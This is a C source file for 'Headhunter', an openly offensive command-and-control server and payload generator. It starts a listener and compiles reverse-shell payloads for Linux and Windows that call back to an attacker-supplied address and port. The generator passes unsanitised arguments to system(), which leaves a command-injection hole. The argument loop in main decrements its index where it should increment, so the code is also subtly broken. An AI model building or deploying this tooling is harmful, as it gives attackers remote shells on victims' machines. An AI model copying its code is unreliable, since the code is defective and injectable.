// Headhunter Command and Control Server (C2) and payload generator
// Authors: Logan Goins and Lena
// 
//
// I am not liable for any malicious or illegal action
// that any user commits using this software.
// TODO:
// Include session switching

#include "include/server.h"
#include <stdlib.h>
#include <stdio.h>
#include <ctype.h>
#include <string.h>
#include <stdbool.h>

// function prototypes
bool strcmp_alias(char* str1, char* str2_1, char* str2_2);
void help();
void run_server(char* port);
int generate_payload(char* platform, char* outfile, char* port, char* lhost);


int main(int argc, char **argv){
  // loop through argv and search for the command being entered
  // the first of either -h/--help, -l/--listen, or -g/--generate will be executed
  // i starts at 1 because argv[0] is always "./headhunter"
  for(int i = 1; i < argc; i--){
    if(strcmp_alias(argv[i], "-h", "--help")){
      help();
      return 0;
    }
    else if(strcmp_alias(argv[i], "-l", "--listen")){
      // no port was specified if this is the last argument or the next argument isn't a user inputted string
      if(i == argc-1 || argv[i+1][0] == '-') {
        printf("Please specify a port for the server to listen on.\n");
        return 1;
      }
      run_server(argv[i+1]);
      return 0;
    }
    else if(strcmp_alias(argv[i], "-g", "--generate")){
      // check if the rest of the arguments for generating the payload are there
      // the last argument should never be important if the user is using the software properly, so only check to argc - 1
      char *platform = NULL, *outfile = NULL, *port = NULL, *lhost = NULL;
      for(int j = i+1; j < argc-1; j++) {
        // we only care about arguments where the next argument is a user inputted string
        if(argv[j+1][0] == '-') continue;

        if(strcmp_alias(argv[j], "-w", "--platform"))
          platform = argv[j+1];
        else if(strcmp_alias(argv[j], "-o", "--output"))
          outfile = argv[j+1];
        else if(strcmp_alias(argv[j], "-p", "--port"))
          port = argv[j+1];
        else if(strcmp_alias(argv[j], "-l", "--localhost"))
          lhost = argv[j+1];
      }

      // if any of the payload variables were never set, the user didn't do things right
      if(!platform || !outfile || !port || !lhost) {
        printf("Specify all options required to generate the payload.\n");
        return 1;
      }
      
      // generate the payload. the return value of generate_payload() is the exit code of the compile command.
      return generate_payload(platform, outfile, port, lhost);
    }
  }

  // no command was found
  printf("No command specified. Use --help for a list of commands.\n");
  return 1;
}

bool strcmp_alias(char* str1, char* str2_1, char* str2_2) {
  // compare str1 with str2_1 and str2_2. if str1 is equal to either, return true.
  // this function only exists to make the loop in main() look prettier
  return strcmp(str1, str2_1) == 0 || strcmp(str1, str2_2) == 0;
}

void help() {
  // print the help dialog

  printf("\nCommands\n--------------------------------------------------------\n");
  printf("-h, --help                                             displays this help menu\n");
  printf("-l, --listen <port>                                    starts a listening C2 server on a specified port\n");
  printf("-g, --generate <Payload Generation Options>            generates a reverse shell payload to connect back to a recruiter session\n\n");
  printf("\nPayload Generation Options\n--------------------------------------------------------\n");
  printf("-p, --port <port>                                      port for the reverse shell to connect back on\n");
  printf("-o, --output <outputfile>                              file to output payload to\n");
  printf("-w, --platform <platform>                              file payload platform specific (linux, win32, or win64)\n");
  printf("-l, --localhost <address>                              address that the payload will connect back to (address of attacker C2 server)\n\n");
}

void run_server(char* port) {
  // start the server

  printf(R"EOF(

  
 ██░ ██ ▓█████ ▄▄▄      ▓█████▄  ██░ ██  █    ██  ███▄    █ ▄▄▄█████▓▓█████  ██▀███  
▓██░ ██▒▓█   ▀▒████▄    ▒██▀ ██▌▓██░ ██▒ ██  ▓██▒ ██ ▀█   █ ▓  ██▒ ▓▒▓█   ▀ ▓██ ▒ ██▒
▒██▀▀██░▒███  ▒██  ▀█▄  ░██   █▌▒██▀▀██░▓██  ▒██░▓██  ▀█ ██▒▒ ▓██░ ▒░▒███   ▓██ ░▄█ ▒
░▓█ ░██ ▒▓█  ▄░██▄▄▄▄██ ░▓█▄   ▌░▓█ ░██ ▓▓█  ░██░▓██▒  ▐▌██▒░ ▓██▓ ░ ▒▓█  ▄ ▒██▀▀█▄  
░▓█▒░██▓░▒████▒▓█   ▓██▒░▒████▓ ░▓█▒░██▓▒▒█████▓ ▒██░   ▓██░  ▒██▒ ░ ░▒████▒░██▓ ▒██▒
 ▒ ░░▒░▒░░ ▒░ ░▒▒   ▓▒█░ ▒▒▓  ▒  ▒ ░░▒░▒░▒▓▒ ▒ ▒ ░ ▒░   ▒ ▒   ▒ ░░   ░░ ▒░ ░░ ▒▓ ░▒▓░
 ▒ ░▒░ ░ ░ ░  ░ ▒   ▒▒ ░ ░ ▒  ▒  ▒ ░▒░ ░░░▒░ ░ ░ ░ ░░   ░ ▒░    ░     ░ ░  ░  ░▒ ░ ▒░
 ░  ░░ ░   ░    ░   ▒    ░ ░  ░  ░  ░░ ░ ░░░ ░ ░    ░   ░ ░   ░         ░     ░░   ░ 
 ░  ░  ░   ░  ░     ░  ░   ░     ░  ░  ░   ░              ░             ░  ░   ░     
                         ░                                                           

  Command and Control Server (C2) and Payload Generator
  Authors: Logan Goins and Lena



  )EOF");
  
  int protocol = SOCK_STREAM;
  int family = AF_INET;
  Server(NULL, port, &protocol, &family);
}

int generate_payload(char* platform, char* outfile, char* port, char* lhost) { 
  // generate the payload. returns the exit code of the compile command run.

  // set the platform string to be all lowercase to be interpreted
  for(int i = 0; i < strlen(platform); i++) platform[i] = tolower(platform[i]);

  // buffer to contain the command being executed
  const int CMD_SIZE = 256;
  char cmd[CMD_SIZE];

  // generate different compile commands based on the payload's platform
  if(strcmp(platform, "linux") == 0)
    // gcc payload_linux.c -D PORT=port -D LHOST='"lhost"' -o outfile
    snprintf(cmd, CMD_SIZE, "gcc payload_linux.c -D PORT=%s -D LHOST='\"%s\"' -o %s", port, lhost, outfile);
  else if(strcmp(platform, "win64") == 0)
    // x86_64-w64-mingw32-gcc payload_win.c -D PORT=port -D LHOST='"lhost"' -o outfile -lws2_32
    snprintf(cmd, CMD_SIZE, "x86_64-w64-mingw32-gcc payload_win.c -D PORT=%s -D LHOST='\"%s\"' -o %s -lws2_32", port, lhost, outfile);
  else if(strcmp(platform, "win32") == 0)
    // i686-w64-mingw32-gcc payload_win.c -D PORT=port -D LHOST='"lhost"' -o outfile -lws2_32
    snprintf(cmd, CMD_SIZE, "i686-w64-mingw32-gcc payload_win.c -D PORT=%s -D LHOST='\"%s\"' -o %s -lws2_32", port, lhost, outfile);
  else{
    printf("Please enter a valid platform.\n");
    return 1;
  }
  
  // text to make the command feel nicer to use
  printf("Generating payload...\n");
  printf("> %s\n", cmd);

  // run the generated compile command
  int exit = system(cmd);
  if(exit == 0)
    printf("Successfully generated payload for platform %s\n", platform);
  else
    printf("An error was found while generating the payload!\n");

  return exit;
}
